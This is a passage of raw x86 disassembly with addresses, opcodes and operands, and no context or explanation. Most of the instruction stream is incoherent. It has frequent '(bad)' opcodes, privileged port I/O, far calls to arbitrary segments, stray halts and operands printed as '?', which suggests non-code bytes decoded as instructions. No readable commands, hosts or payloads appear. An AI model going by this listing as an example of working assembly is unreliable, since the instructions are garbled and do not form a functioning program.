  4117fc:	jb     0x4117c0
  4117fe:	and    eax,0x2fcbacf8
  411803:	(bad)  
  411805:	fnstenv [ecx-0x22b22ff9]
  41180b:	daa    
  41180c:	dec    edx
  41180d:	jns    0x4117a3
  41180f:	test   DWORD PTR [eax-0x6e],ecx
  411812:	mov    ss:0x97f19bdf,al
  411818:	sub    BYTE PTR [edi+edx*8],cl
  41181b:	dec    ebx
  41181c:	xchg   edx,eax
  41181d:	mov    ebp,0x604dc079
  411822:	push   0x7b4ebdc1
  411827:	fdiv   st,st(5)
  411829:	adc    ebp,0x12
  41182c:	call   0x54b6:0x706a708e
  411833:	mov    ch,0x89
  411835:	stos   BYTE PTR es:[edi],al
  411836:	bound  edi,QWORD PTR [eax+0x4a]
  411839:	out    0xe3,al
  41183b:	pusha  
  41183c:	inc    eax
  41183d:	data16 jno 0x411865
  411840:	aaa    
  411841:	icebp  
  411842:	xor    cl,ah
  411844:	sub    BYTE PTR [ebp+0x4ac9e23e],al
  41184a:	sub    BYTE PTR [ebp+0x6f],dh
  41184d:	rol    DWORD PTR [ecx],1
  41184f:	bound  esi,QWORD PTR [edi+0x77ee78d6]
  411855:	sbb    BYTE PTR [eax+ebp*8-0x4],dh
  411859:	jnp    0x411845
  41185b:	add    esp,DWORD PTR [ebx-0x22]
  41185e:	fs sahf 
  411860:	xlat   BYTE PTR ds:[ebx]
  411861:	mov    esp,0x94de0fa3
  411866:	ss sti 
  411868:	sub    DWORD PTR [eax],0x79d7ffad
  41186e:	jns    0x4118a4
  411870:	jp     0x41180b
  411872:	in     eax,dx
  411873:	and    bh,ah
  411875:	mov    DWORD PTR [edi-0x10],ebx
  411878:	cwde   
  411879:	mov    esi,0x522e40b4
  41187e:	stos   DWORD PTR es:[edi],eax
  41187f:	push   cs
  411880:	cmp    ebx,DWORD PTR ds:0x12eba3f3
  411886:	ds adc eax,0xb3302853
  41188c:	loopne 0x411858
  41188e:	fstp   st(4)
  411890:	stos   DWORD PTR es:[edi],eax
  411891:	add    esp,0xffffff9e
  411894:	xor    dh,BYTE PTR [edx]
  411896:	ins    DWORD PTR es:[edi],dx
  411897:	aam    0x6
  411899:	xchg   BYTE PTR [edx+0x49],bh
  41189c:	(bad)  
  41189e:	mov    ch,0xb9
  4118a0:	sub    ch,BYTE PTR [ebp-0x7a66a6e6]
  4118a6:	(bad)  
  4118a7:	and    BYTE PTR [eax],al
  4118a9:	push   cs
  4118aa:	jle    0x4118f6
  4118ac:	jbe    0x411883
  4118ae:	dec    ebx
  4118af:	pop    edx
  4118b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b1:	out    dx,eax
  4118b2:	jecxz  0x411848
  4118b4:	pop    es
  4118b5:	fcom   DWORD PTR [ebx+eiz*8+0x4c0ef14e]
  4118bc:	pop    ecx
  4118bd:	(bad)  [ebp-0x11]
  4118c0:	jmp    0x906718f5
  4118c5:	push   cs
  4118c6:	fcom   QWORD PTR [ecx+0x3bf780c0]
  4118cc:	lock test al,0x9d
  4118cf:	jb     0x4118af
  4118d1:	mov    ds:0xfe172314,eax
  4118d6:	ret    
  4118d7:	jo     0x41191f
  4118d9:	stc    
  4118da:	icebp  
  4118db:	dec    ebp
  4118dc:	imul   esp,DWORD PTR [ebx+0x77],0xb639ce75
  4118e3:	xchg   ecx,eax
  4118e4:	jae    0x411937
  4118e6:	or     ecx,DWORD PTR [edx-0x5fff13b]
  4118ec:	dec    esi
  4118ed:	out    dx,eax
  4118ee:	inc    ebp
  4118ef:	in     al,0x43
  4118f1:	in     al,dx
  4118f2:	mov    esp,0xf0392733
  4118f7:	xchg   esp,eax
  4118f8:	push   0x1b02a7f5
  4118fd:	xchg   esi,eax
  4118fe:	ret    
  4118ff:	aaa    
  411900:	std    
  411901:	jmp    FWORD PTR [ebp+0x5a]
  411904:	mov    ebp,DWORD PTR [ebx]
  411906:	mov    ebx,0x9488f777
  41190b:	or     DWORD PTR ds:0xe9daa47e,eax
  411911:	in     al,dx
  411912:	ret    0x7c65
  411915:	retf   0x1f00
  411918:	in     eax,0x4c
  41191a:	or     al,0x2
  41191c:	pop    ebx
  41191d:	mov    fs,WORD PTR [esi+esi*1-0x6f592fc2]
  411924:	(bad)  
  411925:	in     eax,0x8b
  411927:	stos   BYTE PTR es:[edi],al
  411928:	shl    BYTE PTR [ecx+0x3259b281],cl
  41192e:	fnstsw WORD PTR [ecx+0x5f0d8345]
  411934:	neg    BYTE PTR [ebx+0x1b]
  411937:	xchg   ecx,eax
  411938:	lods   eax,DWORD PTR ds:[esi]
  411939:	stos   BYTE PTR es:[edi],al
  41193a:	jge    0x411904
  41193c:	js     0x4118e5
  41193e:	sub    bl,0x5f
  411941:	scas   eax,DWORD PTR es:[edi]
  411942:	popf   
  411943:	mov    ebx,0xcd545522
  411948:	fwait
  411949:	xchg   esp,eax
  41194a:	inc    ebp
  41194b:	arpl   WORD PTR [eax+ebx*2-0xc0b6546],bp
  411952:	mov    dh,BYTE PTR gs:[esi]
  411955:	lock daa 
  411957:	mov    DWORD PTR [esi],esi
  411959:	jns    0x4119d6
  41195b:	push   ss
  41195c:	aaa    
  41195d:	leave  
  41195e:	lods   al,BYTE PTR ds:[esi]
  41195f:	jns    0x41197a
  411961:	sbb    BYTE PTR [eax+0x51],cl
  411964:	or     eax,DWORD PTR [ebx+0x1e704375]
  41196a:	push   ds
  41196b:	jno    0x4119a9
  41196d:	mov    dl,0xd6
  41196f:	xchg   ebp,eax
  411970:	mov    BYTE PTR ds:0xcf2e9eb,ch
  411976:	sub    al,0xe0
  411978:	gs and al,0x86
  41197b:	pop    ds
  41197c:	leave  
  41197d:	in     al,dx
  41197e:	mov    BYTE PTR [ebx+ebp*4+0x18f4ed93],bl
  411985:	mov    eax,eax
  411987:	fcmovbe st,st(5)
  411989:	pop    ecx
  41198a:	loop   0x4119fa
  41198c:	cwde   
  41198d:	jl     0x4119d3
  41198f:	rcr    DWORD PTR [esi+0x62],1
  411992:	in     eax,0xc0
  411994:	pop    eax
  411995:	add    al,0xb9
  411997:	mov    DWORD PTR [eax+0x58a9e3c6],esp
  41199d:	or     BYTE PTR ds:0xb4e3b6a9,dl
  4119a3:	mov    ebp,0xb13b030
  4119a8:	push   edx
  4119aa:	xor    al,0x79
  4119ac:	nop
  4119ad:	outs   dx,DWORD PTR ds:[esi]
  4119ae:	in     eax,0x4e
  4119b0:	inc    esp
  4119b1:	rcr    DWORD PTR [eax*4-0x13955c4b],0xde
  4119b9:	dec    ebx
  4119ba:	dec    eax
  4119bb:	mov    WORD PTR [eax-0x332d10a7],gs
  4119c1:	rcr    esi,0x58
  4119c4:	dec    edi
  4119c5:	pop    esi
  4119c6:	lods   eax,DWORD PTR ds:[esi]
  4119c7:	push   ecx
  4119c8:	hlt    
  4119c9:	fmul   st(6),st
  4119cb:	ja     0x41198c
  4119cd:	inc    esi
  4119ce:	fmul   DWORD PTR [ecx+0x4fbd6a3e]
  4119d4:	inc    ebp
  4119d5:	dec    esi
  4119d6:	cld    
  4119d7:	xor    al,0xe7
  4119d9:	mov    bl,0xa3
  4119db:	cli    
  4119dc:	shr    ebp,0x63
  4119df:	into   
  4119e0:	jecxz  0x411a2b
  4119e2:	cs xor eax,0x7f053822
  4119e8:	xor    eax,0x7a680115
  4119ed:	mov    al,ds:0x8bfd8f73
  4119f2:	enter  0x5c83,0xd6
  4119f6:	push   ds
  4119f7:	test   al,0xef
  4119f9:	mov    esp,0xa61fd47
  4119fe:	pop    eax
  4119ff:	mov    bl,0x73
  411a01:	repz mov esi,0x2030795b
  411a07:	sub    DWORD PTR [ecx-0x64f959c5],esi
  411a0d:	and    DWORD PTR [ebx+0x7c7cad03],esi
  411a13:	push   ss
  411a14:	sbb    BYTE PTR [ebx],dh
  411a16:	and    esp,eax
  411a18:	int    0xb4
  411a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1b:	(bad)  
  411a1d:	inc    ecx
  411a1e:	mov    eax,0x2ec64b53
  411a23:	sbb    eax,0xe3612be1
  411a28:	pop    ds
  411a29:	int    0xbd
  411a2b:	addr16 (bad) 
  411a2d:	retf   
  411a2e:	sub    BYTE PTR [ebp-0x76f9effb],0xdc
  411a35:	mov    ds,WORD PTR [esi-0x45]
  411a38:	retf   
  411a39:	outs   dx,BYTE PTR ds:[esi]
  411a3a:	add    eax,edi
  411a3c:	mov    dl,0xe8
  411a3e:	jecxz  0x411aa2
  411a40:	sar    BYTE PTR [edx+0x59c08697],cl
  411a46:	sub    edi,0x5988659
  411a4c:	dec    ecx
  411a4d:	jl     0x411a22
  411a4f:	std    
  411a50:	mov    esp,DWORD PTR [ebx]
  411a52:	push   es
  411a53:	imul   ebp,DWORD PTR [ebx-0x34c5805e],0x79f44c4f
  411a5d:	aaa    
  411a5e:	or     DWORD PTR [ecx+0x51],0x61
  411a62:	mov    edi,DWORD PTR [edx+0x29]
  411a65:	xchg   DWORD PTR [ebx+ecx*2-0x37eb5a1f],ebx
  411a6c:	das    
  411a6d:	jecxz  0x411a74
  411a6f:	bound  esp,QWORD PTR fs:[edi-0x78]
  411a73:	popf   
  411a74:	inc    edi
  411a75:	mov    al,BYTE PTR [edx+0x18201034]
  411a7b:	add    DWORD PTR [edx+0x6c83c906],eax
  411a81:	mov    bl,BYTE PTR [ecx-0x4b]
  411a84:	mov    ah,0x6b
  411a86:	xchg   ebp,eax
  411a87:	(bad)  [eax]
  411a89:	test   DWORD PTR [esi],ebp
  411a8b:	sbb    dh,bl
  411a8d:	sub    eax,0xba09d657
  411a92:	jbe    0x411b06
  411a94:	sbb    DWORD PTR [edi+ebp*1-0x403db917],eax
  411a9b:	cmp    ah,BYTE PTR gs:[eax+0x1c40e462]
  411aa2:	inc    ebx
  411aa3:	das    
  411aa4:	pop    esp
  411aa5:	rcr    DWORD PTR [ebx+0x4],cl
  411aa8:	sbb    BYTE PTR [edx],ah
  411aaa:	xor    al,0xda
  411aac:	out    0xcb,eax
  411aae:	mov    dl,0x4a
  411ab0:	sub    dl,dl
  411ab2:	jmp    0xbdb9:0xd2ffffa4
  411ab9:	and    DWORD PTR [ebp-0x3e],ebx
  411abc:	inc    ebp
  411abd:	adc    edx,DWORD PTR [edx]
  411abf:	out    0xa7,eax
  411ac1:	xchg   BYTE PTR [ecx+0x26],al
  411ac4:	addr16 (bad) 
  411ac6:	add    esp,esp
  411ac8:	je     0x411ad5
  411aca:	aad    0x94
  411acc:	jae    0x411b0d
  411ace:	mov    ebp,0xe883ac7b
  411ad3:	out    0xc8,al
  411ad5:	cmp    al,0x2d
  411ad7:	mov    bh,ch
  411ad9:	sbb    esi,DWORD PTR ds:0x5569ead4
  411adf:	jecxz  0x411b1d
  411ae1:	stos   DWORD PTR es:[edi],eax
  411ae2:	cmp    ebp,ebx
  411ae4:	push   edi
  411ae5:	pop    ebx
  411ae6:	neg    BYTE PTR [edi-0x12]
  411ae9:	mov    edi,DWORD PTR [edi-0x42]
  411aec:	mov    esp,0xd38cd999
  411af1:	repnz push ecx
  411af3:	in     al,dx
  411af4:	mov    edx,0x52b97a2e
  411af9:	fld    QWORD PTR [edi]
  411afb:	sub    BYTE PTR [edi-0x32a2c946],dh
  411b01:	fisttp DWORD PTR [edi+0x26dae1d]
  411b07:	add    BYTE PTR [eax-0x35689c5b],dl
  411b0d:	and    DWORD PTR [ebx-0x25],0x98e61b61
  411b14:	inc    ebx
  411b15:	call   0xf0f9:0x8740fcd
  411b1c:	adc    BYTE PTR [edx+0x23],0xf6
  411b20:	push   es
  411b21:	fiadd  DWORD PTR [ebx]
  411b23:	mov    ebx,0xa6158a25
  411b28:	mul    BYTE PTR [eax]
  411b2a:	setae  BYTE PTR [edi]
  411b2d:	cmc    
  411b2e:	in     eax,0xdd
  411b30:	or     DWORD PTR [edx],eax
  411b32:	stos   DWORD PTR es:[edi],eax
  411b33:	xor    DWORD PTR [edx-0x21ff3b43],esi
  411b39:	shr    DWORD PTR [ecx],1
  411b3b:	rol    DWORD PTR [edi],cl
  411b3d:	xchg   DWORD PTR [ecx+eiz*4-0x67],ebx
  411b41:	add    edi,DWORD PTR [edx]
  411b43:	xchg   ebx,eax
  411b44:	jle    0x411b2f
  411b46:	loop   0x411ba8
  411b48:	gs ret 
  411b4a:	scas   eax,DWORD PTR es:[edi]
  411b4b:	and    DWORD PTR [edi-0x2],esp
  411b4e:	xor    BYTE PTR [ebx+0x58f3f05b],0x69
  411b55:	sbb    BYTE PTR [edx+0x28],dl
  411b58:	jo     0x411ba0
  411b5a:	(bad)  
  411b5b:	aam    0xaa
  411b5d:	dec    esp
  411b5e:	dec    edx
  411b5f:	loope  0x411afa
  411b61:	xchg   edi,eax
  411b62:	div    BYTE PTR [ecx+0x56]
  411b65:	retf   0xa88
  411b68:	xor    eax,0x5b829c7b
  411b6d:	jmp    0x411b72
  411b6f:	sub    eax,0xa636a997
  411b74:	hlt    
  411b75:	(bad)  
  411b76:	aas    
  411b77:	clc    
  411b78:	cmp    eax,0x14153fdf
  411b7d:	dec    eax
  411b7e:	aam    0xc7
  411b80:	pop    eax
  411b81:	pop    eax
  411b82:	or     ah,cl
  411b84:	ret    0x78fe
  411b87:	fwait
  411b88:	stos   BYTE PTR es:[edi],al
  411b89:	mov    dl,0x96
  411b8b:	fimul  WORD PTR [eax+0x56e07f81]
  411b91:	dec    esp
  411b92:	outs   dx,DWORD PTR ds:[esi]
  411b93:	mov    DWORD PTR [ecx+0x293cb9d9],ecx
  411b99:	sbb    cl,BYTE PTR ds:0x75c20c0b
  411b9f:	pushf  
  411ba0:	or     ah,dl
  411ba2:	inc    ecx
  411ba3:	sub    al,0xba
  411ba5:	or     DWORD PTR [ebx-0x80],0xf4e941de
  411bac:	mov    WORD PTR [ebx-0x4e],?
  411baf:	stos   DWORD PTR es:[edi],eax
  411bb0:	loopne 0x411c2b
  411bb2:	sub    eax,0xec3d53b2
  411bb7:	xor    bh,dh
  411bb9:	nop
  411bba:	xor    edi,DWORD PTR [esi]
  411bbc:	dec    edx
  411bbd:	fistp  QWORD PTR [ebx-0x76693b1a]
  411bc3:	mov    WORD PTR [esi-0x2ec37508],ds
  411bc9:	pop    esp
  411bca:	and    al,0xf5
  411bcc:	xchg   esp,eax
  411bcd:	adc    esp,esi
  411bcf:	push   ds
  411bd0:	sbb    eax,edx
  411bd2:	sub    eax,0x5bdefb99
  411bd7:	add    al,0x3b
  411bd9:	mov    edi,DWORD PTR [ecx-0x7a]
  411bdc:	xor    ebp,DWORD PTR [esi]
  411bde:	mov    edx,0xc8dee9f4
  411be3:	xchg   ecx,eax
  411be4:	mov    ?,WORD PTR [ebx+0xf39a44b]
  411bea:	clc    
  411beb:	aaa    
  411bec:	cdq    
  411bed:	add    eax,0x6a7ce8f0
  411bf2:	or     DWORD PTR [ebp-0x697738f4],0x39
  411bf9:	pop    ebx
  411bfa:	stos   BYTE PTR es:[edi],al
  411bfb:	outs   dx,BYTE PTR ds:[esi]
  411bfc:	mov    ebx,0xa998668b
  411c01:	clc    
  411c02:	xchg   ebp,eax
  411c03:	add    ah,ch
  411c05:	(bad)  
  411c06:	jl     0x411c4b
  411c08:	pop    esp
  411c09:	(bad)  
  411c0a:	and    eax,DWORD PTR [esi-0x76305d5b]
  411c10:	sub    eax,DWORD PTR [ebp+0x29]
  411c13:	inc    BYTE PTR [edi]
  411c15:	dec    esi
  411c16:	mov    ebp,0x399f646f
  411c1b:	xor    eax,0xbf507b87
  411c20:	push   edx
  411c21:	pop    eax
  411c22:	and    esp,ebx
  411c24:	not    BYTE PTR [ecx+ebp*2]
  411c27:	mov    eax,es
  411c29:	jne    0x411bdc
  411c2b:	xchg   edx,eax
  411c2c:	mov    gs,eax
  411c2e:	jp     0x411c58
  411c30:	call   0x4be7066e
  411c35:	lahf   
  411c36:	mov    ah,0xfd
  411c38:	jl     0x411c51
  411c3a:	pop    ds
  411c3b:	or     DWORD PTR [esi+0x6d9329c3],0xd66874d3
  411c45:	mov    BYTE PTR [ebx+ebx*8],ah
  411c48:	adc    DWORD PTR [ebp+0x23],edx
  411c4b:	dec    ebp
  411c4c:	popf   
  411c4d:	pop    ecx
  411c4e:	adc    ah,BYTE PTR [ecx]
  411c50:	pop    ss
  411c51:	mov    bl,0xab
  411c53:	mov    BYTE PTR [edi],al
  411c55:	clc    
  411c56:	iret   
  411c57:	fiadd  DWORD PTR [eax-0x5ee8778e]
  411c5d:	push   eax
  411c5e:	call   DWORD PTR [edi-0x4d]
  411c61:	cmp    eax,DWORD PTR [esi]
  411c63:	pushf  
  411c64:	xor    al,BYTE PTR [ebx+edi*1+0x7f]
  411c68:	jne    0x411c2f
  411c6a:	and    eax,0xa4a262d0
  411c6f:	jnp    0x411cc8
  411c71:	aam    0x6a
  411c73:	inc    ebx
  411c74:	stos   DWORD PTR es:[edi],eax
  411c75:	inc    ebp
  411c76:	gs inc edi
  411c78:	pop    esi
  411c79:	mov    bh,0x6e
  411c7b:	dec    eax
  411c7c:	add    cl,bh
  411c7e:	in     al,dx
  411c7f:	jmp    0x411c7a
  411c81:	fdiv   st(5),st
  411c83:	dec    ecx
  411c84:	inc    esp
  411c85:	pop    ebx
  411c86:	fisub  WORD PTR [eax+ebx*8-0x4d]
  411c8a:	cmp    BYTE PTR ds:0x78c24691,bl
  411c90:	pusha  
  411c91:	je     0x411c34
  411c93:	outs   dx,DWORD PTR ds:[esi]
  411c94:	in     eax,dx
  411c95:	outs   dx,DWORD PTR ds:[esi]
  411c96:	or     BYTE PTR [eax+0x47],bl
  411c99:	pushf  
  411c9a:	shl    BYTE PTR [ebp+0x2a69e129],1
  411ca0:	dec    esp
  411ca1:	xor    bl,BYTE PTR [esi-0x69688b1]
  411ca7:	test   DWORD PTR [ebx+edx*4+0x61],edi
  411cab:	shr    BYTE PTR [edi+0x61],1
  411cae:	mov    WORD PTR [ebx],gs
  411cb0:	(bad)  
  411cb1:	in     eax,dx
  411cb2:	add    al,BYTE PTR [eax]
  411cb4:	loopne 0x411c61
  411cb6:	mov    eax,ds:0xd95a9034
  411cbb:	and    eax,0x88c1fbb9
  411cc0:	adc    BYTE PTR ds:0x5eff2f70,bh
  411cc6:	popa   
  411cc7:	daa    
  411cc8:	sbb    BYTE PTR [ebx],bl
  411cca:	jae    0x411ca6
  411ccc:	cpuid  
  411cce:	ficom  WORD PTR [eax+0x749977e8]
  411cd4:	add    al,0x43
  411cd6:	pop    ebp
  411cd7:	aad    0xed
  411cd9:	mov    al,BYTE PTR [ebx-0x74]
  411cdc:	jmp    0x411ce0
  411cde:	jle    0x411d1b
  411ce0:	fwait
  411ce1:	mov    dh,0xc9
  411ce3:	retf   
  411ce4:	push   edi
  411ce5:	sahf   
  411ce6:	push   edi
  411ce7:	in     al,0x1a
  411ce9:	dec    eax
  411cea:	cmp    al,0xc2
  411cec:	arpl   WORD PTR [edi-0x19],ax
  411cef:	xlat   BYTE PTR ds:[ebx]
  411cf0:	inc    ebp
  411cf2:	loope  0x411d55
  411cf4:	pop    ss
  411cf5:	adc    eax,DWORD PTR [ecx+0x67704c7b]
  411cfb:	jae    0x411cb1
  411cfd:	push   0x3f
  411cff:	mov    ebx,DWORD PTR [esi+0x17]
  411d02:	ins    DWORD PTR es:[edi],dx
  411d03:	dec    esp
  411d04:	xchg   edi,eax
  411d05:	cli    
  411d06:	mov    bl,0xdb
  411d08:	mov    BYTE PTR [eax],0x12
  411d0b:	call   0xc3f43d94
  411d10:	jnp    0x411d8c
  411d12:	dec    ebx
  411d13:	inc    ebp
  411d14:	push   edi
  411d15:	std    
  411d16:	sti    
  411d17:	fucomi st,st(2)
  411d19:	neg    BYTE PTR [esi+ebp*4-0x7983128a]
  411d20:	ror    esi,cl
  411d22:	or     DWORD PTR [ecx],ebx
  411d24:	and    eax,0xaab7370c
  411d29:	sbb    cl,BYTE PTR [esi-0xf526220]
  411d2f:	loop   0x411d12
  411d31:	cld    
  411d32:	call   0x40944a05
  411d37:	push   ss
  411d38:	pcmpeqb mm7,mm1
  411d3b:	jmp    0x87c5:0x9b8ca191
  411d42:	push   eax
  411d43:	cmp    eax,0xfd74c239
  411d48:	imul   dh
  411d4a:	ret    
  411d4b:	jl     0x411d7c
  411d4d:	stos   BYTE PTR es:[edi],al
  411d4e:	or     DWORD PTR [ebp-0x5e],0x34
  411d52:	in     eax,0xb
  411d54:	fs dec ebp
  411d56:	jno    0x411d7c
  411d58:	pop    ds
  411d59:	ja     0x411d41
  411d5b:	pusha  
  411d5c:	mov    cl,0xb
  411d5e:	dec    ebp
  411d5f:	add    dl,bh
  411d61:	add    bl,ah
  411d63:	mov    ds:0x79f8571f,al
  411d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d6a:	fistp  DWORD PTR [ebx-0x3]
  411d6d:	jnp    0x411dca
  411d6f:	stos   DWORD PTR es:[edi],eax
  411d70:	jg     0x411d82
  411d72:	aam    0x1d
  411d74:	sub    dl,BYTE PTR [ebx-0x1dae9370]
  411d7a:	fadd   QWORD PTR [edx+0x7c]
  411d7d:	xchg   esi,eax
  411d7e:	and    BYTE PTR [edi+0x3],al
  411d81:	pop    esp
  411d82:	mul    DWORD PTR [esp+edx*2]
  411d85:	or     DWORD PTR [ebp-0x702b5f0],0xffffffce
  411d8c:	test   al,0x1e
  411d8e:	pop    ebx
  411d8f:	jl     0x411d41
  411d91:	js     0x411dc4
  411d93:	inc    ebp
  411d94:	stos   DWORD PTR es:[edi],eax
  411d95:	retf   0xceb6
  411d98:	rcl    BYTE PTR [esi],cl
  411d9a:	push   esp
  411d9b:	(bad)  
  411d9c:	fdivr  st,st(3)
  411d9e:	cdq    
  411d9f:	div    DWORD PTR [ecx+0x5e]
  411da2:	outs   dx,DWORD PTR ds:[esi]
  411da3:	cs xor eax,0xf5338d6f
  411da9:	mov    ah,0x33
  411dab:	cmp    DWORD PTR [ecx+edx*8+0x5902fc19],edi
  411db2:	arpl   WORD PTR [ebp+0x5e],sp
  411db5:	mov    ds:0x6585cb69,eax
  411dba:	nop
  411dbb:	cdq    
  411dbc:	shl    al,cl
  411dbe:	ja     0x411d6b
  411dc0:	sbb    al,BYTE PTR [edi]
  411dc2:	jmp    FWORD PTR ds:[esi]
  411dc5:	stos   DWORD PTR es:[edi],eax
  411dc6:	mov    eax,0x92c0c6d1
  411dcb:	adc    DWORD PTR [edi-0x6ad93756],edx
  411dd1:	mov    DWORD PTR [ebx+0x48],edi
  411dd4:	sub    BYTE PTR [ebx],bl
  411dd6:	jns    0x411d72
  411dd8:	jecxz  0x411da4
  411dda:	(bad)  
  411ddb:	pop    ebp
  411ddc:	or     bl,BYTE PTR [edx-0xc]
  411ddf:	dec    edi
  411de0:	call   0x9d90:0xd15d4de8
  411de7:	jo     0x411d8e
  411de9:	sub    edi,DWORD PTR [edi-0x6f]
  411dec:	mov    WORD PTR [ebx+0x8],cs
  411def:	xor    BYTE PTR [eax+0x787d5fd5],bl
  411df5:	sti    
  411df6:	aas    
  411df7:	lahf   
  411df8:	scas   eax,DWORD PTR es:[edi]
  411df9:	in     eax,dx
  411dfa:	mov    ecx,0xdfc21f3b
  411dff:	loopne 0x411de8
  411e01:	inc    ecx
  411e02:	xor    al,0xf9
  411e04:	(bad)  
  411e06:	bound  ecx,QWORD PTR [esi+0x5b378262]
  411e0c:	xlat   BYTE PTR ds:[ebx]
  411e0d:	stos   BYTE PTR es:[edi],al
  411e0e:	push   ebp
  411e0f:	or     al,0xdd
  411e11:	add    eax,0xb97f2fe0
  411e16:	push   ds
  411e17:	cli    
  411e18:	fidiv  WORD PTR [ebp+ecx*4+0x4545b49c]
  411e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e20:	retf   0xa086
  411e23:	sbb    DWORD PTR [esi+0x55943086],eax
  411e29:	sbb    al,BYTE PTR [ebx+0x6e]
  411e2c:	sahf   
  411e2d:	inc    esi
  411e2e:	adc    dh,BYTE PTR [edx+0x1a]
  411e31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e32:	les    esp,FWORD PTR [esi]
  411e34:	dec    esp
  411e35:	inc    esp
  411e36:	fnstcw WORD PTR [ebp-0x4c8fefe7]
  411e3c:	push   edx
  411e3d:	stos   BYTE PTR es:[edi],al
  411e3e:	mov    ah,0xd
  411e40:	dec    ebx
  411e41:	test   edx,esp
  411e43:	adc    al,0x47
  411e45:	adc    eax,DWORD PTR [esi-0x4d87041d]
  411e4b:	das    
  411e4c:	lds    esp,FWORD PTR [ebx]
  411e4e:	(bad)  
  411e4f:	in     al,dx
  411e50:	test   eax,0xe64b7aec
  411e55:	bound  edx,QWORD PTR [edi]
  411e57:	and    al,0x19
  411e59:	lods   eax,DWORD PTR ds:[esi]
  411e5a:	mov    ebp,0xa5d2cc30
  411e5f:	ins    DWORD PTR es:[edi],dx
  411e60:	adc    DWORD PTR [ebx-0x78],edi
  411e63:	cs inc edi
  411e65:	adc    ah,BYTE PTR [edx+0x4e]
  411e68:	and    BYTE PTR [esi],bl
  411e6a:	nop
  411e6b:	jbe    0x411df6
  411e6d:	pop    eax
  411e6e:	sbb    BYTE PTR [ebx],dl
  411e70:	fs pop ebp
  411e72:	mov    dh,0xce
  411e74:	cmc    
  411e75:	sub    BYTE PTR [edx+ebp*2-0x22],ch
  411e79:	mov    cl,0x93
  411e7b:	aad    0x51
  411e7d:	nop
  411e7e:	loope  0x411e5e
  411e80:	in     eax,dx
  411e81:	sbb    ch,BYTE PTR [esi+0x7]
  411e84:	dec    ebx
  411e85:	xor    dl,BYTE PTR [edi-0x9157eb6]
  411e8b:	jmp    0x411e5e
  411e8d:	adc    edi,DWORD PTR [ecx-0x75]
  411e90:	pop    ebp
  411e91:	pop    ecx
  411e92:	mov    ch,BYTE PTR [ecx-0x49763c24]
  411e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e99:	loope  0x411e1c
  411e9b:	fiadd  DWORD PTR [ebp+0x4f4c62de]
  411ea1:	pop    ecx
  411ea2:	jge    0x411e68
  411ea4:	fst    DWORD PTR [ecx+0x5c311969]
  411eaa:	push   esp
  411eab:	xchg   ebp,eax
  411eac:	or     BYTE PTR [esi+0x5d],bh
  411eaf:	jl     0x411e47
  411eb1:	xchg   BYTE PTR [edi],al
  411eb3:	nop
  411eb4:	push   0xb03b9fd8
  411eb9:	jge    0x411f20
  411ebb:	mov    al,0xdc
  411ebd:	mov    dl,0x1c
  411ebf:	in     eax,dx
  411ec0:	dec    eax
  411ec1:	cmp    al,BYTE PTR [ecx-0x5e]
  411ec4:	les    esi,FWORD PTR [edi]
  411ec6:	push   ss
  411ec7:	push   0x33b335b3
  411ecc:	arpl   si,dx
  411ece:	imul   ebp,DWORD PTR ds:0xc10e3bf1,0x1130608d
  411ed8:	addr16 pop esp
  411eda:	push   edx
  411edb:	sbb    DWORD PTR [eax+edi*8],edi
  411ede:	loop   0x411eb7
  411ee0:	daa    
  411ee1:	adc    DWORD PTR [edi-0x44e31aa3],edi
  411ee7:	jno    0x411ee6
  411ee9:	inc    esp
  411eea:	test   al,0xc4
  411eec:	mov    al,0x88
  411eee:	add    BYTE PTR [edi-0x7a713026],0x35
  411ef5:	pop    edx
  411ef6:	cmp    al,0x47
  411ef8:	fmul   DWORD PTR [ecx+0x601b0fd6]
  411efe:	mov    al,0x2
  411f00:	test   BYTE PTR [eax],al
  411f02:	arpl   WORD PTR [edx+0x8],sp
  411f05:	ret    0xb244
  411f08:	hlt    
  411f09:	push   esi
  411f0a:	retf   0x653
  411f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f0e:	xchg   ebp,eax
  411f0f:	and    al,0x92
  411f11:	cmp    ebp,DWORD PTR [ebx-0x55]
  411f14:	sar    BYTE PTR [ebx-0x29],1
  411f17:	retf   0x9e29
  411f1a:	dec    ecx
  411f1b:	dec    eax
  411f1c:	and    eax,0x3e92080a
  411f21:	icebp  
  411f22:	adc    eax,0xa6083227
  411f27:	aam    0x91
  411f29:	iret   
  411f2a:	xlat   BYTE PTR ds:[ebx]
  411f2b:	dec    ebp
  411f2c:	(bad)  
  411f2d:	sub    eax,0x798125bf
  411f32:	js     0x411ebd
  411f34:	pop    esi
  411f35:	or     eax,0x69f1e0ac
  411f3a:	cs pop ss
  411f3c:	cmp    dl,al
  411f3e:	fild   DWORD PTR [edi]
  411f40:	jo     0x411f9b
  411f42:	dec    esi
  411f43:	jecxz  0x411f03
  411f45:	outs   dx,BYTE PTR ds:[esi]
  411f46:	aas    
  411f47:	push   edi
  411f48:	into   
  411f49:	bnd jmp 0x58911187
  411f4f:	call   0xa5bc08cf
  411f54:	add    al,0x6e
  411f56:	jns    0x411f93
  411f58:	pusha  
  411f59:	dec    edx
  411f5a:	cld    
  411f5b:	arpl   WORD PTR [edi+0x6b34eec3],bp
  411f61:	jb     0x411f17
  411f63:	adc    DWORD PTR [ecx],0x90ba6336
  411f69:	retf   
  411f6a:	mov    bh,0x91
  411f6c:	xchg   esp,eax
  411f6d:	dec    ebx
  411f6e:	das    
  411f6f:	jae    0x411ef7
  411f71:	inc    ebp
  411f72:	jle    0x411f2a
  411f74:	jns    0x411f11
  411f76:	scas   al,BYTE PTR es:[edi]
  411f77:	not    DWORD PTR [ebp-0x41d9b6d0]
  411f7d:	loope  0x411f74
  411f7f:	addr16 pop ebp
  411f81:	(bad)  
  411f82:	xor    ch,BYTE PTR [edx-0x6fd0333d]
  411f88:	mov    edi,0xa48b95d6
  411f8d:	xchg   cl,bh
  411f8f:	(bad)  
  411f90:	fdivr  DWORD PTR [eax-0x3024fd35]
  411f96:	xor    DWORD PTR [ebp-0x61],edx
  411f99:	mov    ch,0xda
